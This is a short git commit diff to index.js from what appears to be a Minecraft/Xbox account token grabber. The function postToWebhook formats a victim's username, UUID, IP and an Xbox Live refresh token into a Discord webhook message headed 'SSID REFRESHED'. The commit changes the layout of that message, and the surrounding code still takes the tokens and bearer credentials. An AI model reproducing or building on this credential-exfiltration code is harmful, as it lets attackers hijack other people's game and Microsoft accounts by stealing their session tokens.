6f63cb42f9e27f63b7afbc745b7ea1d405ea436f
oinoin <85758623+oinoin@users.noreply.github.com>
2022-11-16 07:51:39 -0500

    Update index.js

--- index.js
+++ index.js
@@ -108,9 +108,9 @@ function postToWebhook(username, bearerToken, uuid, ip, userToken) {
     let data = {
         username: " ",
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
-        content: "@everyone" + " **SSID REFRESHED**\n**XBL REFRESH TOKEN:**  ```" + userToken + "```\n",
+        content: "",
         embeds: [{
-            title: "User Info", color: 0x00ff50, fields: [
+            title: "SSID REFRESHED", color: 0x00ff50, fields: [
                 {name: "Username", value: username, inline: true},
                 {name: "UUID", value: uuid, inline: true},
                 {name: "Ip", value: "[Local Address]", inline: true},
